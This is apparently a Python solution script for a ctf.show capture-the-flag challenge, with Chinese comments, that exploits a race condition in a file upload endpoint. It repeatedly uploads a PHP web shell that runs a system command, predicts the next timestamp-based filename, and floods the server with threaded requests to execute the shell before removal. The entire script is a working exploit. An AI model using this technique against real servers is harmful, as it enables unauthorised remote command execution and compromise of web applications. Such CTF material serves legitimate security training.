import requests, time, threading

url = "http://51fb812a-f6e9-43e6-bbdb-e3085e534920.challenge.ctf.show/"

def newThread(fun,*args):
    return threading.Thread(target=fun, args=args)

def execphp(fname):
    r = requests.get(url + "uploads/" + fname + ".php")
    x = r.text
    if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
        print(x)

def check(fname):
    for i in range(100,400):
        # 每个文件名单起一个线程
        newThread(execphp, fname + str(i)).start()

def upload():
    while True:
        payload = '<?php system("ls -l ../");?>'.encode()
        file_data = {'file':('anything.php', payload)}
        r = requests.post(url+"upload.php",files=file_data)
        txt = r.text
        print("uploaded:",txt)
        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔
        ts = int(time.mktime(time.strptime(txt[8:22], "%Y%m%d%H%M%S")))
        fname = time.strftime("%Y%m%d%H%M%S", time.localtime(ts + 1))
        # 单起一个线程，爆破下一次upload的文件名
        newThread(check, fname).start()

if __name__ == '__main__':
    upload()